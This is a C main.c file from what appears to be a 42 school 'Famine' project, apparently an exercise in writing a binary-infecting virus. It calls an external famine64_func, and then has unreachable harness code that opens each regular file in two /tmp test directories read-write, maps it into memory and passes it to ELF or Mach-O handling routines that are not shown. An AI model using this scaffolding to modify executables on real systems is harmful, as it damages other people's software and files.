/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: gbourgeo <marvin@42.fr>                    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/20 20:13:56 by gbourgeo          #+#    #+#             */
/*   Updated: 2018/05/28 18:53:50 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <dirent.h>
#include "ft_printf.h"
#include "libft.h"
#include "famine.h"

void famine64_func();

int				main(void)
{
	const char	*dir[] = { "/tmp/test/", "/tmp/test2/", NULL };
	t_env		e;

	famine64_func();
	exit(0);
	ft_memset(&e, 0, sizeof(e));
	for (int i = 0; dir[i]; i++)
	{
		DIR				*rep;
		struct dirent	*file;
		char			*path;
		int				fd;
		void			*data;
		int				size;

		ft_printf("OK\n");
		if ((rep = opendir(dir[i])) != NULL)
		{
			while ((file = readdir(rep)))
			{
				if (file->d_type == DT_REG)
				{
					path = ft_strjoin(dir[i], file->d_name);
					ft_printf("%s: ", path);
					fd = 0; size = 0; data = NULL;
					if ((fd = open(path, O_RDWR)) != -1			&&
						(size = lseek(fd, 1, SEEK_END)) != -1	&&
						(data = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) != MAP_FAILED)
					{
						close(fd);
						e.data = data;
						e.size = size;
						e.path = path;
#ifdef __linux__
						get_elf(&e);
#elif __APPLE__
						get_macho(&e);
#endif
					}
					if (path)
						free(path);
					if (fd != -1)
						close(fd);
					if (data)
						munmap(data, size);
					ft_printf(" (%d %d %p)\n", fd, size, data);
				}
			}
			closedir(rep);
		}
	}
	return (0);
}

/*
struct linux_dirent {
unsigned long  d_ino;     // Inode number
unsigned long  d_off;     // Offset to next linux_dirent 
unsigned short d_reclen;  // Length of this linux_dirent 
char           d_name[];  // Filename (null-terminated) 
						  // length is actually (d_reclen - 2 -
						  //   offsetof(struct linux_dirent, d_name))

char           pad;       // Zero padding byte
char           d_type;    // File type (only since Linux
						  // 2.6.4); offset is (d_reclen - 1)
}
*/
